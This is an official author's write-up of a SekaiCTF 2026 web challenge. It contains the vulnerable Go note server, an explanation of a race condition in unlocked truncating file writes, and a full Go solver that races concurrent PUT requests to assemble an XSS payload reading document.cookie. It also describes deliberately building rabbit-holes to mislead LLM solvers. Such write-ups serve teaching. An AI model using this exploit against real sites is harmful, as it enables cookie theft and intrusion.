---
title: SekaiCTF 2026 Author's Writeup
date: 2026-06-29
layout: writeup
official: true
language: en
tags:
  - Web
---

I made a simple web challenge for [SekaiCTF 2026](https://ctftime.org/event/3113/). This article is author's official writeup.

# [web] &amp;lt;\w+

> HTML unescape + Regex to delete all = What can I do?

## Overview

This is a simple XSS challenge. Users can create short notes, but the payloads are sanitized.
Notes are saved in the file system, rather than a database.

Golang server source code:

```go
package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"unicode/utf8"

	"github.com/google/uuid"
	"github.com/microcosm-cc/bluemonday"
)

func sanitizer(msg string) (string, error) {
	if len(msg) > 128 {
		return "", fmt.Errorf("too long message")
	}

	if utf8.ValidString(msg) == false {
		return "", fmt.Errorf("invalid character")
	}

	sanitized := bluemonday.StrictPolicy().Sanitize(msg)

	// &lt;\w+
	sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
	sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")
	var reHTML = regexp.MustCompile(`<(/)?\w+`)

	sanitized = reHTML.ReplaceAllString(sanitized, "")

	return sanitized, nil
}

func generateID() uuid.UUID {
	return uuid.New()
}

func validateID(id string) error {
	_, err := uuid.Parse(id)
	return err
}

func main() {
	mux := http.NewServeMux()

	// top
	mux.HandleFunc("GET /", func(w http.ResponseWriter, r *http.Request) {
		f, err := os.Open("/app/index.html")
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		defer f.Close()

		stat, err := f.Stat()
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		http.ServeContent(w, r, "index.html", stat.ModTime(), f)
	})

	// create note
	mux.HandleFunc("POST /create", func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseForm(); err != nil {
			http.Error(w, "invalid form data", http.StatusBadRequest)
			return
		}

		sanitized, err := sanitizer(r.FormValue("message"))
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		id := generateID()
		filePath := fmt.Sprintf("/app/notes/%s", id)

		f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		defer f.Close()

		if _, err := f.Write([]byte(sanitized)); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		http.Redirect(w, r, fmt.Sprintf("/notes/%s", id.String()), http.StatusSeeOther)
	})

	// read note
	mux.HandleFunc("GET /notes/{id}", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		if err := validateID(id); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		filePath := fmt.Sprintf("/app/notes/%s", id)
		data, err := os.ReadFile(filePath)
		if err != nil {
			http.Error(w, "note not found", http.StatusNotFound)
			return
		}

		w.Header().Set("Content-Type", "text/html;charset=utf-8")
		w.Write(data)
	})

	// edit note
	mux.HandleFunc("PUT /notes/{id}", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		if err := validateID(id); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		if err := r.ParseForm(); err != nil {
			http.Error(w, "invalid form data", http.StatusBadRequest)
			return
		}

		sanitized, err := sanitizer(r.FormValue("message"))
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		filePath := fmt.Sprintf("/app/notes/%s", id)
		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			http.Error(w, "note not found", http.StatusNotFound)
			return
		}

		f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		defer f.Close()

		if _, err := f.Write([]byte(sanitized)); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		http.Redirect(w, r, fmt.Sprintf("/notes/%s", id), http.StatusSeeOther)
	})

	log.Println("listening on :8080")
	log.Fatal(http.ListenAndServe(":8080", mux))
}
```

The behavior of this sanitizer is a bit strange.

1. Check the length and characters of the string.
2. Use `bluemonday.StrictPolicy()` to remove all HTML tags and attributes.
3. Restore `<` and `>`.
4. Remove text that resembles HTML tags in the format `<(/)?\w+`.

```go
func sanitizer(msg string) (string, error) {
	if len(msg) > 128 {
		return "", fmt.Errorf("too long message")
	}

	if utf8.ValidString(msg) == false {
		return "", fmt.Errorf("invalid character")
	}

	sanitized := bluemonday.StrictPolicy().Sanitize(msg)

	// &lt;\w+
	sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
	sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")
	var reHTML = regexp.MustCompile(`<(/)?\w+`)

	sanitized = reHTML.ReplaceAllString(sanitized, "")

	return sanitized, nil
}
```


## LLMs rabbit-hole

This challenge was made for "unsloppable", so I incorporated various techniques to ensure that LLMs would not arrive at the intended solution.
When performing "LLM babysitting," there are three hurdles to be aware of: the 48-hour contest duration, the 5-hour API limit (which doesn't mean much in this kind of contest), and the amount of "thought" that occurs before context compaction kicks in.

In this challenge, I aimed to make the LLM consider some wrong approaches so that it wouldn't reach the actual solution before the context was compressed (though it was solved regardless).

For example, it is expected to consider the following:

- XSS due to the difference in DOM parsing between Bluemonday and Chromium: No known `StrictPolicy()` bypass has been reported.
- Content-type confusion with tags like `<?xml`: The response header is explicitly set to `text/html;charset=utf-8`.
- Character encoding confusion like ISO-2022-JP: The sanitizer verifies that it is UTF-8.
- Generating non-ASCII character tags such as `<å`: This is impossible because Chromium does not interpret them correctly.

Common LLMs tend to consider these possibilities before the intended solution because these are "common" approaches. And as a result, I intended delaying to make solving it via LLM babysitting difficult.


## Solution

If you perform a few fuzzings, you will see that a single `<` character can be used to create a note without being removed. This is also evident from step 4 of the sanitizer.
However, this alone is not enough to achieve XSS. Therefore, we should focus on the fact that notes are stored in the filesystem.

In Golang, `os.Open()` and `os.OpenFile()` calls internal func `openFileNolog()`

```go
func OpenFile(name string, flag int, perm FileMode) (*File, error) {
	testlog.Open(name)
	f, err := openFileNolog(name, flag, perm)
	if err != nil {
		return nil, err
	}
	f.appendMode = flag&O_APPEND != 0
	return f, nil
}
```
[Source](https://go.googlesource.com/go/+/refs/tags/go1.26.0/src/os/file.go)

And `openFileNolog()` calls the primitive syscall in Unix: `syscall.Open()`.

```go
func openFileNolog(name string, flag int, perm FileMode) (*File, error) {
	...
	var (
		r int
		s poll.SysFile
		e error
	)
	// We have to check EINTR here, per issues 11180 and 39237.
	ignoringEINTR(func() error {
		r, s, e = open(name, flag|syscall.O_CLOEXEC, syscallMode(perm))
		return e
	})
	...
}
```
[Source](https://go.googlesource.com/go/+/refs/tags/go1.26.0/src/os/file_unix.go)

```go
func open(path string, flag int, perm uint32) (int, poll.SysFile, error) {
	fd, err := syscall.Open(path, flag, perm)
	return fd, poll.SysFile{}, err
}
```
[Source](https://go.googlesource.com/go/+/refs/tags/go1.26.0/src/os/file_open_unix.go)


Let's look at the [documentation for `open(2)`](https://man7.org/linux/man-pages/man2/open.2.html).

>  O_TRUNC
>   If the file already exists and is a regular file and the
>   access mode allows writing (i.e., is O_RDWR or O_WRONLY) it
>   will be truncated to length 0.  If the file is a FIFO or
>   terminal device file, the O_TRUNC flag is ignored.
>   Otherwise, the effect of O_TRUNC is unspecified.

It says, `it will be truncated to length 0.` This means that the pointer offset when writing to the file is reset to 0.
Now, let's look at the PUT method in the challenge. File locking is not implemented!

```go
mux.HandleFunc("PUT /notes/{id}", func(w http.ResponseWriter, r *http.Request) {
  id := r.PathValue("id")
  if err := validateID(id); err != nil {
    http.Error(w, err.Error(), http.StatusBadRequest)
    return
  }

  if err := r.ParseForm(); err != nil {
    http.Error(w, "invalid form data", http.StatusBadRequest)
    return
  }

  sanitized, err := sanitizer(r.FormValue("message"))
  if err != nil {
    http.Error(w, err.Error(), http.StatusBadRequest)
    return
  }

  filePath := fmt.Sprintf("/app/notes/%s", id)
  if _, err := os.Stat(filePath); os.IsNotExist(err) {
    http.Error(w, "note not found", http.StatusNotFound)
    return
  }

  f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
  if err != nil {
    http.Error(w, err.Error(), http.StatusInternalServerError)
    return
  }
  defer f.Close()

  if _, err := f.Write([]byte(sanitized)); err != nil {
    http.Error(w, err.Error(), http.StatusInternalServerError)
    return
  }

  http.Redirect(w, r, fmt.Sprintf("/notes/%s", id), http.StatusSeeOther)
})
```

In other words, by writing these two payloads simultaneously to target a race condition, we can create an HTML tag within the note:

- `<`
- `*img src=x onerror=...>`


The final solver is here:

```go
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

const (
	baseURL = "https://challenge.server"
)

// post to /create
func createNote(message string) (string, error) {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.PostForm(baseURL+"/create", url.Values{"message": {message}})
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to create note: %s", string(body))
	}

	location := resp.Header.Get("Location")
	id := strings.TrimPrefix(location, "/notes/")
	return id, nil
}

// put to /notes/{id}
func updateNote(id, message string) error {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	form := url.Values{"message": {message}}
	req, err := http.NewRequest("PUT", fmt.Sprintf("%s/notes/%s", baseURL, id), strings.NewReader(form.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to update note: %s", string(body))
	}

	return nil
}

// get to /notes/{id}
func getNote(id string) (string, error) {
	resp, err := http.Get(fmt.Sprintf("%s/notes/%s", baseURL, id))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to get note: %s", string(body))
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	payload := "<img src=x onerror=alert(document.cookie)>"
	p1 := "<"
	p2 := "*" + payload[1:]

	id, err := createNote("foo")
	if err != nil {
		fmt.Println("create error:", err)
		return
	}

	for {
		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			err := updateNote(id, p2)
			if err != nil {
				fmt.Println("update error:", err)
				return
			}
		}()

		go func() {
			defer wg.Done()
			err := updateNote(id, p1)
			if err != nil {
				fmt.Println("update error:", err)
				return
			}
		}()

		wg.Wait()

		content, err := getNote(id)
		fmt.Println("now:", content)
		if err != nil {
			fmt.Println("get error:", err)
			return
		}

		if content == payload {
			fmt.Println("pwned!", content)
			fmt.Println("Report this ID:", id)
			fmt.Println("URL:", fmt.Sprintf("%s/notes/%s", baseURL, id))
			return
		}

		time.Sleep(50 * time.Millisecond)
	}
}
```
